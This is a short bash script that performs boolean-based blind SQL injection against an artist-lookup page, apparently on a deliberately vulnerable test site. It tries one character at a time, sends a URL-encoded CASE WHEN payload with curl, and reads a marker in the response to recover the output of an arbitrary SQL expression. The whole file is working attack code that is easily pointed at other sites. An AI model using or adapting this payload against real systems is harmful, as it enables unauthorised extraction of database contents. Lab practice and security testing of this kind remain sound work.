#!/bin/bash

dec() { printf "%d" "'$1"; }
hex() { printf "%x" "'$1"; }

SQL=$1
index=$2

chars="-.0123456789:_abcdefghijklmnopqrstuvwxyz"
for c in $(echo ${chars}|fold -w1); do
  dc=$(dec $c)
  INJECTION="1+and+1%3d(case+when+ord(substr(lcase($SQL),$index,1))%3d$dc+then+1+else+0+end)"
  res=$(curl -s "http://testphp.vulnweb.com/artists.php?artist=$INJECTION")
  # TRUE response condition
  if echo $res | grep -q "r4w8173"; then
    echo $index $c; break;
  fi
done
